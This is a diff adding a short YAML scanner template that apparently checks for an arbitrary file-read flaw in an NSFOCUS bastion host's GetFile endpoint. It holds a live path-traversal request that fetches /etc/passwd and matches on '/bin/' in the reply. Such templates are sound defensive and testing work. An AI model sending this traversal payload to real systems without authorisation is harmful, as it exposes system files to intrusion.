@@ -1,0 +1,13 @@
+name: 绿盟-堡垒机-GetFile-文件读取
+description: >-
+  文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd
+    expression:
+      status: 200
+      body_all:
+        - "/sbin/"
+        - "/bin/"
